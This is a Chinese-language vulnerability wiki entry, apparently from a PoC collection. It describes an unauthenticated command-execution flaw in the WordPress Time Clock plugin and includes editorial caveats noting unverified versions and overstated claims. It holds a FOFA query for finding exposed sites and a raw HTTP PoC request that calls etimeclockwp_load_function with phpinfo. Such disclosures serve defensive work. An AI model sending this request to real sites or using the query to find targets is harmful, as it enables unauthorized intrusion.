---
fofa: ""
source: "SourByte05/Vulnerability-Wiki-PoC"
product: "WordPress Time Clock / Time Clock Pro"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "body="
title: "WordPress Time Clock插件存在命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：vulnerable versions absent; unauth AJAX claimed"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-fcac906c2b2ee85c83ab4fc2"
entity_id: "ve-fcac906c2b2ee85c83ab4fc2"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：vulnerable versions absent; unauth AJAX claimed

- **结论使用边界（1）**：function=phpinfo只证明PHP函数调用，不能单独证明任意系统命令及带参数调用能力。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：frontmatter fofa=body残缺，正文完整；影响版本只有产品名。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：HTTP/2写成原始HTTP1文本且Content-Length16与15字节正文需重算。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：在野已知/影响面广无出处，修复无版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（5）**：与493同入口/载荷，后者带CVE9593与&lt;=1.2.2，宜合并互补。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress Time Clock插件存在命令执行漏洞

# 漏洞描述

WordPress Time Clock插件 /wp-admin/admin-ajax.php存在命令执行漏洞，未经身份验证攻击者可执行系统命令，导致网站处于极度不安全状态。

# 影响版本

WordPress Time Clock插件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/wp-content/plugins/time-clock/" || body="/wp-content/plugins/time-clock-pro/"

POC/EXP：

POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

function=phpinfo

![image-20241030110851534](./.resource/WordPressTimeClock插件存在命令执行漏洞/media/image-20241030110851534.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
